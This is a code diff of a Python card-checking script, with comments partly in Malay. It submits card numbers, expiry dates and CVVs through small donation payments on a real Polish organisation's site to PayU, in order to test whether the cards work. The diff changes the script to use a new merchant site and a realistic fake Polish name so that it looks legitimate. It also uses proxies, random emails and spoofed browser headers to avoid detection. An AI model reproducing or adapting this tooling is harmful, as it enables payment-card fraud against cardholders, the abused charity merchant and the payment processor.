@@ -72,12 +72,12 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     return data
 
 def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
-    """Synchronous PayU charge check via Alternative PayU PL Merchant"""
+    """Synchronous PayU charge check via Active PayU PL Merchant"""
     session = requests.Session()
     try:
         email = _random_email()
         ua = _random_ua()
-        name = "Python Shelby"
+        name = "Jan Kowalski" # Nama Poland standard supaya tak nampak spam
 
         if proxy_str:
             session.proxies = {
@@ -88,15 +88,15 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Create order via ALTERNATIVE MERCHANT ───
+        # ─── Step 1: Create order via ACTIVE MERCHANT (spsroktow.pl) ───
         headers1 = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://serwiskrs.pl',
-            'referer': 'https://serwiskrs.pl/',
-            'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+            'origin': 'https://spsroktow.pl',
+            'referer': 'https://spsroktow.pl/wplac/',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'document',
@@ -107,19 +107,21 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'user-agent': ua,
         }
 
+        # Data yang diperlukan oleh laman web ini untuk trigger PayU
         data1 = {
-            'imie': name.split()[0] if ' ' in name else name,
-            'nazwisko': name.split()[1] if ' ' in name else '',
+            'action': 'payu',
+            'amount': '5.00', # Minimum yang diterima oleh sistem mereka
+            'description': 'Darowizna na cele statutowe',
+            'name': name,
             'email': email,
-            'kwota': '1.00',
-            'opis': 'Donation',
         }
 
-        r1 = session.post('https://serwiskrs.pl/payu.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)
+        r1 = session.post('https://spsroktow.pl/wplac/', headers=headers1, data=data1, allow_redirects=False, timeout=30)
 
         order_id = None
         token = None
 
+        # Cuba ekstrak dari header redirect
         if 'Location' in r1.headers:
             loc = r1.headers['Location']
             oid = re.search(r'orderId=([^&]+)', loc)
@@ -129,6 +131,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             if tok:
                 token = tok.group(1)
 
+        # Kalau tak jumpa di header, mungkin ada di dalam body (kadang-kadang server return 200 dulu)
         if not order_id or not token:
             body = r1.text
             oid = re.search(r'orderId["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
@@ -139,7 +142,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 token = tok.group(1)
 
         if not order_id or not token:
-            return 'Failed to extract orderId or token from new merchant', {"error": "Could not parse order", "status_code": r1.status_code, "body_snippet": r1.text[:500]}
+            return 'Failed to extract orderId or token', {"error": "Could not parse order", "status_code": r1.status_code, "body_snippet": r1.text[:500]}
 
         # ─── Step 2: Load PayU pay page ───
         params2 = {
@@ -152,8 +155,8 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'priority': 'u=0, i',
-            'referer': 'https://serwiskrs.pl/',
-            'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+            'referer': 'https://spsroktow.pl/',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'document',
@@ -167,7 +170,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
         
         # Auto-Reader untuk dapat exact amount & currency
-        final_amount = 100 # Default 1.00 PLN
+        final_amount = 500 # Default 5.00 PLN
         final_currency = 'PLN'
         
         try:
@@ -191,7 +194,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'origin': 'https://secure.payu.com',
             'priority': 'u=1, i',
             'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
-            'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'empty',
